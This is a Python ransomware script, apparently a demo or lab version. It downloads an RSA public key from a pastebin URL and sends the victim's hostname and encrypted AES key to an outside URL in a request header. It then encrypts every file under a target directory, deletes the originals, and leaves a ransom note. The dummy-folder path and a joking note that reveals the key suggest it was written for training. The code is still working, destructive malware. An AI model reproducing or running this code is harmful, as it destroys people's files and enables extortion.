#! /usr/bin/env python3

from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
from cryptography.hazmat.primitives import serialization,hashes
from cryptography.hazmat.primitives.asymmetric import rsa,padding
from cryptography.hazmat.backends import default_backend
import os
import requests
import sys
import socket

# CHANGE THESE
ROOT_DIR = '/home/vagrant/dummyFolder'
CANARY_TOKEN = ""
PUBLIC_KEY = 'https://pastebin.com/raw/GDWLQgdJ'

def listAllFiles(ROOT_DIR):
    files_list = []
    try:
        for root,_dirs,files in os.walk(ROOT_DIR):
            for i in files:
                filepath = root + '/' + i
                files_list += [filepath]
    except Exception as _e:
        pass
    return files_list

def sendKey(key,url):
    '''
    Send the encrypted key before start encrypting.
    '''
    content = socket.gethostname() + ":" + key
    headers = {"User-Agent":content}
    try:
        r = requests.get(url,headers=headers)
        if r.status_code != 200:
            sys.exit()
    except:
        sys.exit()

def rsaEncrypt(content,publickey_bytes):
    'This function is to encrypt the symetric key using rsa'
    publickey = serialization.load_pem_public_key(publickey_bytes,backend=default_backend())
    cipher = publickey.encrypt(content,padding.OAEP(mgf = padding.MGF1(algorithm = hashes.SHA256()), algorithm = hashes.SHA256(),label = None))
    return cipher

def getKey(publickkey):
    try: 
        download_key = requests.get(PUBLIC_KEY).text
        key = '\n'.join(download_key.split("\r\n"))
        return key.encode()
    except:
        print('[Error] Exitting.')
        sys.exit()

def Encryptor(plaintext,filename="encrypted",hex=False,key=None):
    # ENCRYPTOR
    # Generate Key and IV for encrypting
    # Encrypt data and write IV + cipher to a txt file seperated by ":"
    if not key: # Generate a key for encryption if no key is specified
        key = os.urandom(32)
    IV = os.urandom(16)
    context = Cipher(algorithms.AES(key),modes.CTR(IV),backend=default_backend())
    cipher = context.encryptor().update(plaintext) + context.encryptor().finalize()
    if hex:
        with open(f"{filename}.hex","w") as f:
            content = IV.hex() + ":" + cipher.hex()
            f.write(content)
    else:
        with open(f"{filename}.bin","wb") as f:
            content = IV + cipher
            f.write(content)
    return key.hex()


if __name__ == "__main__":
    # PREPARE KEYS
    publickey = getKey(PUBLIC_KEY)
    key = os.urandom(32)
    key_encrypted = rsaEncrypt(key,publickey)
    sendKey(key_encrypted.hex(),CANARY_TOKEN)

    # BEGIN ENCRYPTING FILES
    for i in listAllFiles(ROOT_DIR):
        try:
            print(f"Encrypting: {i}")
            with open(i,'rb') as f:
                content = f.read()
            Encryptor(content,i,key=key)
        except Exception as e:
            print(e)
        
        os.remove(i) # remove data
    with open(f"{ROOT_DIR}/README!!!.txt",'w') as f:
        content = f"Hello, all your files has been encrypted.\nThe key to decrypt will only be provided upon payment! muahahahaha!\nJust kidding. The key is:\t{key.hex()}\n"
        f.write(content)